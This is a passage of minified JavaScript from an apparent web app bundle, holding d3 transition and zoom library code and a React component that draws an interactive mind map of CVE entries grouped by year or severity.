Kc(a);y.state===Zc?(y.state=Lr,y.timer.stop(),y.on.call("interrupt",e,e.__data__,y.index,y.group),delete s[u]):+u<n&&(y.state=Lr,y.timer.stop(),y.on.call("cancel",e,e.__data__,y.index,y.group),delete s[u])}if(Kc(function(){t.state===Ar&&(t.state=Zc,t.timer.restart(l,t.delay,t.time),l(c))}),t.state=ll,t.on.call("start",e,e.__data__,t.index,t.group),t.state===ll){for(t.state=Ar,r=new Array(h=t.tween.length),u=0,d=-1;u<h;++u)(y=t.tween[u].value.call(e,e.__data__,t.index,t.group))&&(r[++d]=y);r.length=d+1}}function l(c){for(var u=c<t.duration?t.ease.call(null,c/t.duration):(t.timer.restart(o),t.state=ol,1),d=-1,h=r.length;++d<h;)r[d].call(e,u);t.state===ol&&(t.on.call("end",e,e.__data__,t.index,t.group),o())}function o(){t.state=Lr,t.timer.stop(),delete s[n];for(var c in s)return;delete e.__transition}}function Nr(e,n){var t=e.__transition,s,r,i=!0,a;if(t){n=n==null?null:n+"";for(a in t){if((s=t[a]).name!==n){i=!1;continue}r=s.state>ll&&s.state<ol,s.state=Lr,s.timer.stop(),s.on.call(r?"interrupt":"cancel",e,e.__data__,s.index,s.group),delete t[a]}i&&delete e.__transition}}function S0(e){return this.each(function(){Nr(this,e)})}function _0(e,n){var t,s;return function(){var r=rn(this,e),i=r.tween;if(i!==t){s=t=i;for(var a=0,l=s.length;a<l;++a)if(s[a].name===n){s=s.slice(),s.splice(a,1);break}}r.tween=s}}function E0(e,n,t){var s,r;if(typeof t!="function")throw new Error;return function(){var i=rn(this,e),a=i.tween;if(a!==s){r=(s=a).slice();for(var l={name:n,value:t},o=0,c=r.length;o<c;++o)if(r[o].name===n){r[o]=l;break}o===c&&r.push(l)}i.tween=r}}function T0(e,n){var t=this._id;if(e+="",arguments.length<2){for(var s=Qe(this.node(),t).tween,r=0,i=s.length,a;r<i;++r)if((a=s[r]).name===e)return a.value;return null}return this.each((n==null?_0:E0)(t,e,n))}function fo(e,n,t){var s=e._id;return e.each(function(){var r=rn(this,s);(r.value||(r.value={}))[n]=t.apply(this,arguments)}),function(r){return Qe(r,s).value[n]}}function qd(e,n){var t;return(typeof n=="number"?Sn:n instanceof js?Gc:(t=js(n))?(n=t,Gc):l0)(e,n)}function C0(e){return function(){this.removeAttribute(e)}}function P0(e){return function(){this.removeAttributeNS(e.space,e.local)}}function A0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttribute(e);return a===r?null:a===s?i:i=n(s=a,t)}}function L0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttributeNS(e.space,e.local);return a===r?null:a===s?i:i=n(s=a,t)}}function N0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttribute(e):(a=this.getAttribute(e),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function R0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttributeNS(e.space,e.local):(a=this.getAttributeNS(e.space,e.local),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function O0(e,n){var t=Ti(e),s=t==="transform"?p0:qd;return this.attrTween(e,typeof n=="function"?(t.local?R0:N0)(t,s,fo(this,"attr."+e,n)):n==null?(t.local?P0:C0)(t):(t.local?L0:A0)(t,s,n))}function M0(e,n){return function(t){this.setAttribute(e,n.call(this,t))}}function I0(e,n){return function(t){this.setAttributeNS(e.space,e.local,n.call(this,t))}}function z0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&I0(e,i)),t}return r._value=n,r}function D0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&M0(e,i)),t}return r._value=n,r}function j0(e,n){var t="attr."+e;if(arguments.length<2)return(t=this.tween(t))&&t._value;if(n==null)return this.tween(t,null);if(typeof n!="function")throw new Error;var s=Ti(e);return this.tween(t,(s.local?z0:D0)(s,n))}function B0(e,n){return function(){ho(this,e).delay=+n.apply(this,arguments)}}function F0(e,n){return n=+n,function(){ho(this,e).delay=n}}function U0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?B0:F0)(n,e)):Qe(this.node(),n).delay}function H0(e,n){return function(){rn(this,e).duration=+n.apply(this,arguments)}}function V0(e,n){return n=+n,function(){rn(this,e).duration=n}}function W0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?H0:V0)(n,e)):Qe(this.node(),n).duration}function $0(e,n){if(typeof n!="function")throw new Error;return function(){rn(this,e).ease=n}}function G0(e){var n=this._id;return arguments.length?this.each($0(n,e)):Qe(this.node(),n).ease}function Y0(e,n){return function(){var t=n.apply(this,arguments);if(typeof t!="function")throw new Error;rn(this,e).ease=t}}function q0(e){if(typeof e!="function")throw new Error;return this.each(Y0(this._id,e))}function X0(e){typeof e!="function"&&(e=Pd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new yn(s,this._parents,this._name,this._id)}function K0(e){if(e._id!==this._id)throw new Error;for(var n=this._groups,t=e._groups,s=n.length,r=t.length,i=Math.min(s,r),a=new Array(s),l=0;l<i;++l)for(var o=n[l],c=t[l],u=o.length,d=a[l]=new Array(u),h,y=0;y<u;++y)(h=o[y]||c[y])&&(d[y]=h);for(;l<s;++l)a[l]=n[l];return new yn(a,this._parents,this._name,this._id)}function Q0(e){return(e+"").trim().split(/^|\s+/).every(function(n){var t=n.indexOf(".");return t>=0&&(n=n.slice(0,t)),!n||n==="start"})}function Z0(e,n,t){var s,r,i=Q0(n)?ho:rn;return function(){var a=i(this,e),l=a.on;l!==s&&(r=(s=l).copy()).on(n,t),a.on=r}}function J0(e,n){var t=this._id;return arguments.length<2?Qe(this.node(),t).on.on(e):this.each(Z0(t,e,n))}function ew(e){return function(){var n=this.parentNode;for(var t in this.__transition)if(+t!==e)return;n&&n.removeChild(this)}}function nw(){return this.on("end.remove",ew(this._id))}function tw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=oo(e));for(var s=this._groups,r=s.length,i=new Array(r),a=0;a<r;++a)for(var l=s[a],o=l.length,c=i[a]=new Array(o),u,d,h=0;h<o;++h)(u=l[h])&&(d=e.call(u,u.__data__,h,l))&&("__data__"in u&&(d.__data__=u.__data__),c[h]=d,Pi(c[h],n,t,h,c,Qe(u,t)));return new yn(i,this._parents,n,t)}function sw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=Cd(e));for(var s=this._groups,r=s.length,i=[],a=[],l=0;l<r;++l)for(var o=s[l],c=o.length,u,d=0;d<c;++d)if(u=o[d]){for(var h=e.call(u,u.__data__,d,o),y,k=Qe(u,t),x=0,L=h.length;x<L;++x)(y=h[x])&&Pi(y,n,t,x,h,k);i.push(h),a.push(u)}return new yn(i,a,n,t)}var rw=Ys.prototype.constructor;function iw(){return new rw(this._groups,this._parents)}function aw(e,n){var t,s,r;return function(){var i=Ft(this,e),a=(this.style.removeProperty(e),Ft(this,e));return i===a?null:i===t&&a===s?r:r=n(t=i,s=a)}}function Xd(e){return function(){this.style.removeProperty(e)}}function lw(e,n,t){var s,r=t+"",i;return function(){var a=Ft(this,e);return a===r?null:a===s?i:i=n(s=a,t)}}function ow(e,n,t){var s,r,i;return function(){var a=Ft(this,e),l=t(this),o=l+"";return l==null&&(o=l=(this.style.removeProperty(e),Ft(this,e))),a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l))}}function cw(e,n){var t,s,r,i="style."+n,a="end."+i,l;return function(){var o=rn(this,e),c=o.on,u=o.value[i]==null?l||(l=Xd(n)):void 0;(c!==t||r!==u)&&(s=(t=c).copy()).on(a,r=u),o.on=s}}function uw(e,n,t){var s=(e+="")=="transform"?u0:qd;return n==null?this.styleTween(e,aw(e,s)).on("end.style."+e,Xd(e)):typeof n=="function"?this.styleTween(e,ow(e,s,fo(this,"style."+e,n))).each(cw(this._id,e)):this.styleTween(e,lw(e,s,n),t).on("end.style."+e,null)}function pw(e,n,t){return function(s){this.style.setProperty(e,n.call(this,s),t)}}function dw(e,n,t){var s,r;function i(){var a=n.apply(this,arguments);return a!==r&&(s=(r=a)&&pw(e,a,t)),s}return i._value=n,i}function hw(e,n,t){var s="style."+(e+="");if(arguments.length<2)return(s=this.tween(s))&&s._value;if(n==null)return this.tween(s,null);if(typeof n!="function")throw new Error;return this.tween(s,dw(e,n,t??""))}function fw(e){return function(){this.textContent=e}}function mw(e){return function(){var n=e(this);this.textContent=n??""}}function gw(e){return this.tween("text",typeof e=="function"?mw(fo(this,"text",e)):fw(e==null?"":e+""))}function yw(e){return function(n){this.textContent=e.call(this,n)}}function vw(e){var n,t;function s(){var r=e.apply(this,arguments);return r!==t&&(n=(t=r)&&yw(r)),n}return s._value=e,s}function ww(e){var n="text";if(arguments.length<1)return(n=this.tween(n))&&n._value;if(e==null)return this.tween(n,null);if(typeof e!="function")throw new Error;return this.tween(n,vw(e))}function kw(){for(var e=this._name,n=this._id,t=Kd(),s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)if(o=a[c]){var u=Qe(o,n);Pi(o,e,t,c,a,{time:u.time+u.delay+u.duration,delay:0,duration:u.duration,ease:u.ease})}return new yn(s,this._parents,e,t)}function bw(){var e,n,t=this,s=t._id,r=t.size();return new Promise(function(i,a){var l={value:a},o={value:function(){--r===0&&i()}};t.each(function(){var c=rn(this,s),u=c.on;u!==e&&(n=(e=u).copy(),n._.cancel.push(l),n._.interrupt.push(l),n._.end.push(o)),c.on=n}),r===0&&i()})}var xw=0;function yn(e,n,t,s){this._groups=e,this._parents=n,this._name=t,this._id=s}function Kd(){return++xw}var an=Ys.prototype;yn.prototype={constructor:yn,select:tw,selectAll:sw,selectChild:an.selectChild,selectChildren:an.selectChildren,filter:X0,merge:K0,selection:iw,transition:kw,call:an.call,nodes:an.nodes,node:an.node,size:an.size,empty:an.empty,each:an.each,on:J0,attr:O0,attrTween:j0,style:uw,styleTween:hw,text:gw,textTween:ww,remove:nw,tween:T0,delay:U0,duration:W0,ease:G0,easeVarying:q0,end:bw,[Symbol.iterator]:an[Symbol.iterator]};function Sw(e){return((e*=2)<=1?e*e*e:(e-=2)*e*e+2)/2}var _w={time:null,delay:0,duration:250,ease:Sw};function Ew(e,n){for(var t;!(t=e.__transition)||!(t=t[n]);)if(!(e=e.parentNode))throw new Error(`transition ${n} not found`);return t}function Tw(e){var n,t;e instanceof yn?(n=e._id,e=e._name):(n=Kd(),(t=_w).time=po(),e=e==null?null:e+"");for(var s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&Pi(o,e,n,c,a,t||Ew(o,n));return new yn(s,this._parents,e,n)}Ys.prototype.interrupt=S0;Ys.prototype.transition=Tw;const mr=e=>()=>e;function Cw(e,{sourceEvent:n,target:t,transform:s,dispatch:r}){Object.defineProperties(this,{type:{value:e,enumerable:!0,configurable:!0},sourceEvent:{value:n,enumerable:!0,configurable:!0},target:{value:t,enumerable:!0,configurable:!0},transform:{value:s,enumerable:!0,configurable:!0},_:{value:r}})}function pn(e,n,t){this.k=e,this.x=n,this.y=t}pn.prototype={constructor:pn,scale:function(e){return e===1?this:new pn(this.k*e,this.x,this.y)},translate:function(e,n){return e===0&n===0?this:new pn(this.k,this.x+this.k*e,this.y+this.k*n)},apply:function(e){return[e[0]*this.k+this.x,e[1]*this.k+this.y]},applyX:function(e){return e*this.k+this.x},applyY:function(e){return e*this.k+this.y},invert:function(e){return[(e[0]-this.x)/this.k,(e[1]-this.y)/this.k]},invertX:function(e){return(e-this.x)/this.k},invertY:function(e){return(e-this.y)/this.k},rescaleX:function(e){return e.copy().domain(e.range().map(this.invertX,this).map(e.invert,e))},rescaleY:function(e){return e.copy().domain(e.range().map(this.invertY,this).map(e.invert,e))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};var mo=new pn(1,0,0);pn.prototype;function ra(e){e.stopImmediatePropagation()}function ns(e){e.preventDefault(),e.stopImmediatePropagation()}function Pw(e){return(!e.ctrlKey||e.type==="wheel")&&!e.button}function Aw(){var e=this;return e instanceof SVGElement?(e=e.ownerSVGElement||e,e.hasAttribute("viewBox")?(e=e.viewBox.baseVal,[[e.x,e.y],[e.x+e.width,e.y+e.height]]):[[0,0],[e.width.baseVal.value,e.height.baseVal.value]]):[[0,0],[e.clientWidth,e.clientHeight]]}function Jc(){return this.__zoom||mo}function Lw(e){return-e.deltaY*(e.deltaMode===1?.05:e.deltaMode?1:.002)*(e.ctrlKey?10:1)}function Nw(){return navigator.maxTouchPoints||"ontouchstart"in this}function Rw(e,n,t){var s=e.invertX(n[0][0])-t[0][0],r=e.invertX(n[1][0])-t[1][0],i=e.invertY(n[0][1])-t[0][1],a=e.invertY(n[1][1])-t[1][1];return e.translate(r>s?(s+r)/2:Math.min(0,s)||Math.max(0,r),a>i?(i+a)/2:Math.min(0,i)||Math.max(0,a))}function Ow(){var e=Pw,n=Aw,t=Rw,s=Lw,r=Nw,i=[0,1/0],a=[[-1/0,-1/0],[1/0,1/0]],l=250,o=m0,c=lo("start","zoom","end"),u,d,h,y=500,k=150,x=0,L=10;function p(w){w.property("__zoom",Jc).on("wheel.zoom",E,{passive:!1}).on("mousedown.zoom",I).on("dblclick.zoom",M).filter(r).on("touchstart.zoom",j).on("touchmove.zoom",G).on("touchend.zoom touchcancel.zoom",V).style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}p.transform=function(w,O,P,D){var _=w.selection?w.selection():w;_.property("__zoom",Jc),w!==_?T(w,O,P,D):_.interrupt().each(function(){v(this,arguments).event(D).start().zoom(null,typeof O=="function"?O.apply(this,arguments):O).end()})},p.scaleBy=function(w,O,P,D){p.scaleTo(w,function(){var _=this.__zoom.k,N=typeof O=="function"?O.apply(this,arguments):O;return _*N},P,D)},p.scaleTo=function(w,O,P,D){p.transform(w,function(){var _=n.apply(this,arguments),N=this.__zoom,R=P==null?S(_):typeof P=="function"?P.apply(this,arguments):P,B=N.invert(R),F=typeof O=="function"?O.apply(this,arguments):O;return t(m(f(N,F),R,B),_,a)},P,D)},p.translateBy=function(w,O,P,D){p.transform(w,function(){return t(this.__zoom.translate(typeof O=="function"?O.apply(this,arguments):O,typeof P=="function"?P.apply(this,arguments):P),n.apply(this,arguments),a)},null,D)},p.translateTo=function(w,O,P,D,_){p.transform(w,function(){var N=n.apply(this,arguments),R=this.__zoom,B=D==null?S(N):typeof D=="function"?D.apply(this,arguments):D;return t(mo.translate(B[0],B[1]).scale(R.k).translate(typeof O=="function"?-O.apply(this,arguments):-O,typeof P=="function"?-P.apply(this,arguments):-P),N,a)},D,_)};function f(w,O){return O=Math.max(i[0],Math.min(i[1],O)),O===w.k?w:new pn(O,w.x,w.y)}function m(w,O,P){var D=O[0]-P[0]*w.k,_=O[1]-P[1]*w.k;return D===w.x&&_===w.y?w:new pn(w.k,D,_)}function S(w){return[(+w[0][0]+ +w[1][0])/2,(+w[0][1]+ +w[1][1])/2]}function T(w,O,P,D){w.on("start.zoom",function(){v(this,arguments).event(D).start()}).on("interrupt.zoom end.zoom",function(){v(this,arguments).event(D).end()}).tween("zoom",function(){var _=this,N=arguments,R=v(_,N).event(D),B=n.apply(_,N),F=P==null?S(B):typeof P=="function"?P.apply(_,N):P,te=Math.max(B[1][0]-B[0][0],B[1][1]-B[0][1]),W=_.__zoom,oe=typeof O=="function"?O.apply(_,N):O,se=o(W.invert(F).concat(te/W.k),oe.invert(F).concat(te/oe.k));return function(ce){if(ce===1)ce=oe;else{var He=se(ce),$n=te/He[2];ce=new pn($n,F[0]-He[0]*$n,F[1]-He[1]*$n)}R.zoom(null,ce)}})}function v(w,O,P){return!P&&w.__zooming||new b(w,O)}function b(w,O){this.that=w,this.args=O,this.active=0,this.sourceEvent=null,this.extent=n.apply(w,O),this.taps=0}b.prototype={event:function(w){return w&&(this.sourceEvent=w),this},start:function(){return++this.active===1&&(this.that.__zooming=this,this.emit("start")),this},zoom:function(w,O){return this.mouse&&w!=="mouse"&&(this.mouse[1]=O.invert(this.mouse[0])),this.touch0&&w!=="touch"&&(this.touch0[1]=O.invert(this.touch0[0])),this.touch1&&w!=="touch"&&(this.touch1[1]=O.invert(this.touch1[0])),this.that.__zoom=O,this.emit("zoom"),this},end:function(){return--this.active===0&&(delete this.that.__zooming,this.emit("end")),this},emit:function(w){var O=Tn(this.that).datum();c.call(w,this.that,new Cw(w,{sourceEvent:this.sourceEvent,target:p,transform:this.that.__zoom,dispatch:c}),O)}};function E(w,...O){if(!e.apply(this,arguments))return;var P=v(this,O).event(w),D=this.__zoom,_=Math.max(i[0],Math.min(i[1],D.k*Math.pow(2,s.apply(this,arguments)))),N=Gn(w);if(P.wheel)(P.mouse[0][0]!==N[0]||P.mouse[0][1]!==N[1])&&(P.mouse[1]=D.invert(P.mouse[0]=N)),clearTimeout(P.wheel);else{if(D.k===_)return;P.mouse=[N,D.invert(N)],Nr(this),P.start()}ns(w),P.wheel=setTimeout(R,k),P.zoom("mouse",t(m(f(D,_),P.mouse[0],P.mouse[1]),P.extent,a));function R(){P.wheel=null,P.end()}}function I(w,...O){if(h||!e.apply(this,arguments))return;var P=w.currentTarget,D=v(this,O,!0).event(w),_=Tn(w.view).on("mousemove.zoom",F,!0).on("mouseup.zoom",te,!0),N=Gn(w,P),R=w.clientX,B=w.clientY;Hv(w.view),ra(w),D.mouse=[N,this.__zoom.invert(N)],Nr(this),D.start();function F(W){if(ns(W),!D.moved){var oe=W.clientX-R,se=W.clientY-B;D.moved=oe*oe+se*se>x}D.event(W).zoom("mouse",t(m(D.that.__zoom,D.mouse[0]=Gn(W,P),D.mouse[1]),D.extent,a))}function te(W){_.on("mousemove.zoom mouseup.zoom",null),Vv(W.view,D.moved),ns(W),D.event(W).end()}}function M(w,...O){if(e.apply(this,arguments)){var P=this.__zoom,D=Gn(w.changedTouches?w.changedTouches[0]:w,this),_=P.invert(D),N=P.k*(w.shiftKey?.5:2),R=t(m(f(P,N),D,_),n.apply(this,O),a);ns(w),l>0?Tn(this).transition().duration(l).call(T,R,D,w):Tn(this).call(p.transform,R,D,w)}}function j(w,...O){if(e.apply(this,arguments)){var P=w.touches,D=P.length,_=v(this,O,w.changedTouches.length===D).event(w),N,R,B,F;for(ra(w),R=0;R<D;++R)B=P[R],F=Gn(B,this),F=[F,this.__zoom.invert(F),B.identifier],_.touch0?!_.touch1&&_.touch0[2]!==F[2]&&(_.touch1=F,_.taps=0):(_.touch0=F,N=!0,_.taps=1+!!u);u&&(u=clearTimeout(u)),N&&(_.taps<2&&(d=F[0],u=setTimeout(function(){u=null},y)),Nr(this),_.start())}}function G(w,...O){if(this.__zooming){var P=v(this,O).event(w),D=w.changedTouches,_=D.length,N,R,B,F;for(ns(w),N=0;N<_;++N)R=D[N],B=Gn(R,this),P.touch0&&P.touch0[2]===R.identifier?P.touch0[0]=B:P.touch1&&P.touch1[2]===R.identifier&&(P.touch1[0]=B);if(R=P.that.__zoom,P.touch1){var te=P.touch0[0],W=P.touch0[1],oe=P.touch1[0],se=P.touch1[1],ce=(ce=oe[0]-te[0])*ce+(ce=oe[1]-te[1])*ce,He=(He=se[0]-W[0])*He+(He=se[1]-W[1])*He;R=f(R,Math.sqrt(ce/He)),B=[(te[0]+oe[0])/2,(te[1]+oe[1])/2],F=[(W[0]+se[0])/2,(W[1]+se[1])/2]}else if(P.touch0)B=P.touch0[0],F=P.touch0[1];else return;P.zoom("touch",t(m(R,B,F),P.extent,a))}}function V(w,...O){if(this.__zooming){var P=v(this,O).event(w),D=w.changedTouches,_=D.length,N,R;for(ra(w),h&&clearTimeout(h),h=setTimeout(function(){h=null},y),N=0;N<_;++N)R=D[N],P.touch0&&P.touch0[2]===R.identifier?delete P.touch0:P.touch1&&P.touch1[2]===R.identifier&&delete P.touch1;if(P.touch1&&!P.touch0&&(P.touch0=P.touch1,delete P.touch1),P.touch0)P.touch0[1]=this.__zoom.invert(P.touch0[0]);else if(P.end(),P.taps===2&&(R=Gn(R,this),Math.hypot(d[0]-R[0],d[1]-R[1])<L)){var B=Tn(this).on("dblclick.zoom");B&&B.apply(this,arguments)}}}return p.wheelDelta=function(w){return arguments.length?(s=typeof w=="function"?w:mr(+w),p):s},p.filter=function(w){return arguments.length?(e=typeof w=="function"?w:mr(!!w),p):e},p.touchable=function(w){return arguments.length?(r=typeof w=="function"?w:mr(!!w),p):r},p.extent=function(w){return arguments.length?(n=typeof w=="function"?w:mr([[+w[0][0],+w[0][1]],[+w[1][0],+w[1][1]]]),p):n},p.scaleExtent=function(w){return arguments.length?(i[0]=+w[0],i[1]=+w[1],p):[i[0],i[1]]},p.translateExtent=function(w){return arguments.length?(a[0][0]=+w[0][0],a[1][0]=+w[1][0],a[0][1]=+w[0][1],a[1][1]=+w[1][1],p):[[a[0][0],a[0][1]],[a[1][0],a[1][1]]]},p.constrain=function(w){return arguments.length?(t=w,p):t},p.duration=function(w){return arguments.length?(l=+w,p):l},p.interpolate=function(w){return arguments.length?(o=w,p):o},p.on=function(){var w=c.on.apply(c,arguments);return w===c?p:w},p.clickDistance=function(w){return arguments.length?(x=(w=+w)*w,p):Math.sqrt(x)},p.tapDistance=function(w){return arguments.length?(L=+w,p):L},p}const Mw={cluster:"#c0c0c0",cve:"#d5d5d5"};function Iw({data:e,onSelectCve:n,highlightId:t,hoveredId:s,onHover:r,onFocusPath:i}){const a=C.useRef(null),[l,o]=C.useState(mo),c=C.useRef({id:null,offset:[0,0],pointerId:null}),[u,d]=C.useState({}),h=C.useMemo(()=>{var w;if(!((w=e==null?void 0:e.children)!=null&&w.length))return{nodes:[],links:[],rooms:[],center:{x:480,y:320},width:960,height:640};const v=960,b=640,E={x:v/2,y:b/2},I=e.children,M=Math.min(v,b)/2-120,j=[],G=[],V=[];return I.forEach((O,P)=>{const D=P/I.length*Math.PI*2,_=E.x+Math.cos(D)*M,N=E.y+Math.sin(D)*M,R=O.id||O.name||`group-${P}`,B={id:R,name:O.name,type:"cluster",x:_,y:N,info:O};j.push(B);const F=O.children||[],te=80+Math.min(60,F.length*2);V.push({id:`${R}-room`,x:_,y:N,r:te+26,glyphR:te+12}),F.forEach((W,oe)=>{const se=oe/F.length*Math.PI*2,ce=_+Math.cos(se)*te,He=N+Math.sin(se)*te,$n=W.id||`${R}-cve-${oe}`,Qd={id:$n,name:W.name||$n,type:"cve",x:ce,y:He,info:W};j.push(Qd),G.push({source:R,target:$n})})}),{nodes:j,links:G,rooms:V,center:E,width:v,height:b}},[e]);C.useEffect(()=>{const v={};h.nodes.forEach(b=>{v[b.id]={x:b.x,y:b.y}}),d(v)},[h]);const y=C.useMemo(()=>h.nodes.map(v=>{const b=u[v.id];return b?{...v,x:b.x,y:b.y}:v}),[h.nodes,u]),k=C.useMemo(()=>{const v=new Map;return y.forEach(b=>v.set(b.id,b)),v},[y]),x=v=>{const b=new Map;y.filter(M=>M.type==="cve").forEach(M=>{const j=v(M);j&&(b.has(j)||b.set(j,[]),b.get(j).push(M))});const E=[],I=h.center||{x:0,y:0};return b.forEach(M=>{if(M.length<2)return;const j=[...M].sort((V,w)=>{const O=Math.atan2(V.y-I.y,V.x-I.x),P=Math.atan2(w.y-I.y,w.x-I.x);return O-P}),G=Math.min(j.length,8);for(let V=0;V<G-1;V++){const w=j[V],O=j[V+1];E.push({source:w.id,target:O.id,wiggle:22+Math.random()*26,dash:12+Math.random()*10})}j.length>3&&E.push({source:j[0].id,target:j[j.length-1].id,wiggle:18+Math.random()*20,dash:10+Math.random()*10})}),E},L=C.useMemo(()=>x(v=>{var b;return((b=v.info)==null?void 0:b.year)||"Unknown"}),[y,h.center]),p=C.useMemo(()=>x(v=>{var b;return((b=v.info)==null?void 0:b.severity)||"Info"}),[y,h.center]);C.useEffect(()=>{if(!t||!e)return;const v=[],b=(E,I)=>{const M=E.id||E.name,j=[...I,E.name];if((M==null?void 0:M.toLowerCase())===t.toLowerCase())return v.push(...j),!0;if(!E.children)return!1;for(const G of E.children)if(b(G,j))return!0;return!1};b(e,[]),v.length&&(i==null||i(v))},[t,e,i]),C.useEffect(()=>{const v=Tn(a.current),b=Ow().scaleExtent([.6,2.5]).on("zoom",E=>o(E.transform));return v.call(b),()=>v.on(".zoom",null)},[]);const f=v=>{v.type==="cve"&&(n==null||n(v.info))},m=(v,b)=>{if(!a.current)return;const E=a.current.getBoundingClientRect(),[I,M]=l.invert([b.clientX-E.left,b.clientY-E.top]),j=k.get(v.id)||v;c.current={id:v.id,pointerId:b.pointerId,offset:[I-j.x,M-j.y]},a.current.setPointerCapture(b.pointerId)},S=v=>{if(!(!c.current.id||!a.current)){try{a.current.releasePointerCapture(c.current.pointerId)}catch{}c.current={id:null,offset:[0,0],pointerId:null}}},T=v=>{if(!c.current.id||!a.current)return;const b=a.current.getBoundingClientRect(),[E,I]=l.invert([v.clientX-b.left,v.clientY-b.top]),[M,j]=c.current.offset,G=E-M,V=I-j,w=c.current.id;d(O=>({...O,[w]:{x:G,y:V}}))};return g.jsx("div",{className:"cve-mindmap",children:g.jsxs("svg",{ref:a,viewBox:"0 0 960 640",role:"presentation",onPointerMove:T,onPointerUp:S,onPointerCancel:S,onPointerLeave:S,children:[g.jsx("defs",{children:g.jsxs("filter",{id:"glow",children:[g.jsx("feGaussianBlur",{stdDeviation:"2.5",result:"coloredBlur"}),g.jsxs("feMerge",{children:[g.jsx("feMergeNode",{in:"coloredBlur"}),g.jsx("feMergeNode",{in:"SourceGraphic"})]})]})}),g.jsxs("g",{transform:`translate(${l.x},${l.y}) scale(${l.k})`,children:[h.rooms.map(v=>g.jsxs("g",{className:"mindmap-room",children:[g.jsx("circle",{cx:v.x,cy:v.y,r:v.r,fill:"rgba(255,255,255,0.02)",stroke:"rgba(200,200,200,0.08)",strokeWidth:"1.2"}),g.jsx("g",{className:"glyph-ring","transform-origin":`${v.x} ${v.y}`,children:Array.from({length:12}).map((b,E)=>{const I=E/12*Math.PI*2,M=v.glyphR,j=M+8,G=v.x+Math.cos(I)*M,V=v.y+Math.sin(I)*M,w=v.x+Math.cos(I)*j,O=v.y+Math.sin(I)*j;return g.jsx("line",{x1:G,y1:V,x2:w,y2:O,stroke:"rgba(200,200,200,0.4)",strokeWidth:E%3===0?1.3:.7,opacity:.7},`${v.id}-tick-${E}`)})})]},v.id)),L.map((v,b)=>{const E=k.get(v.source),I=k.get(v.target);if(!E||!I)return null;const M=(E.x+I.x)/2,j=(E.y+I.y)/2,G=I.y-E.y,V=E.x-I.x,w=Math.hypot(G,V)||1,O=G/w*v.wiggle,P=V/w*v.wiggle,D=M+O,_=j+P,N=s&&(s===v.source||s===v.target);return g.jsx("path",{d:`M ${E.x} ${E.y} Q ${D} ${_} ${I.x} ${I.y}`,className:`memory-thread${N?" active":""}`,strokeDasharray:`${v.dash} ${v.dash*1.6}`,style:{animationDelay:`${b*120}ms`}},`thread-year-${b}`)}),p.map((v,b)=>{const E=k.get(v.source),I=k.get(v.target);if(!E||!I)return null;const M=(E.x+I.x)/2,j=(E.y+I.y)/2,G=I.y-E.y,V=E.x-I.x,w=Math.hypot(G,V)||1,O=G/w*v.wiggle*.6,P=V/w*v.wiggle*.6,D=M+O,_=j+P,N=s&&(s===v.source||s===v.target);return g.jsx("path",{d:`M ${E.x} ${E.y} Q ${D} ${_} ${I.x} ${I.y}`,className:`memory-thread severity${N?" active":""}`,strokeDasharray:`${v.dash} ${v.dash*1.8}`,style:{animationDelay:`${b*140}ms`}},`thread-sev-${b}`)}),h.links.map(v=>{var b,E,I,M;return g.jsx("line",{x1:(b=k.get(v.source))==null?void 0:b.x,y1:(E=k.get(v.source))==null?void 0:E.y,x2:(I=k.get(v.target))==null?void 0:I.x,y2:(M=k.get(v.target))==null?void 0:M.y,stroke:"rgba(180, 180, 180, 0.25)",strokeWidth:s&&(v.source===s||v.target===s)?2.2:1},`${v.source}-${v.target}`)}),y.map(v=>{var M;const b=v.type==="cve"?11:18,E=t&&((M=v.id)==null?void 0:M.toLowerCase())===t.toLowerCase(),I=Mw[v.type]||"#d5d5d5";return g.jsxs("g",{transform:`translate(${v.x},${v.y})`,className:`mindmap-node ${v.type}`,onPointerDown:j=>m(v,j),onClick:()=>f(v),onMouseEnter:()=>{var j;if(r){const[G,V]=l.apply([v.x,v.y]),w=(j=a.current)==null?void 0:j.getBoundingClientRect();r({node:v,screen:{x:w?w.left+G:G,y:w?w.top+V:V}})}},onMouseLeave:()=>r==null?void 0:r(null),style:{cursor:"pointer"},children:[g.jsx("circle",{className:"node-spotlight",r:b+16}),g.jsx("circle",{r:b,fill:I,fillOpacity:E?1:.6,stroke:E?"#d5d5d5":"rgba(255,255,255,0.15)",strokeWidth:E?2:1}),g.jsx("circle",{className:"node-halo",r:b+4})]},v.id)})]})]})})}function zw(e=[],n="year"){const t=i=>n==="severity"?i.severity||"Info":i.year||"Unknown",s=e.reduce((i,a)=>{const l=t(a);return i[l]||(i[l]=[]),i[l].push(a),i},{}),r=n==="severity"?(i,a)=>i.localeCompare(a):(i,a)=>a.localeCompare(i);return{name:"CVE Map",children:Object.keys(s).sort(r).map(i=>({id:`${n}-${i}`,name:i,nodeType:"cluster",children:s[i].map(a=>({...a,name:a.id||a.title,value:1,nodeType:"cve"}))}))}}function Dw(){const[e,n]=C.useState("year"),t=C.useMemo(()=>{const p=T=>T.toUpperCase().includes("CVE"),f=T=>{if(!T)return"Unknown";const b=new Date(T).getFullYear();return Number.isFinite(b)?String(b):"Unknown"},m=T=>{const 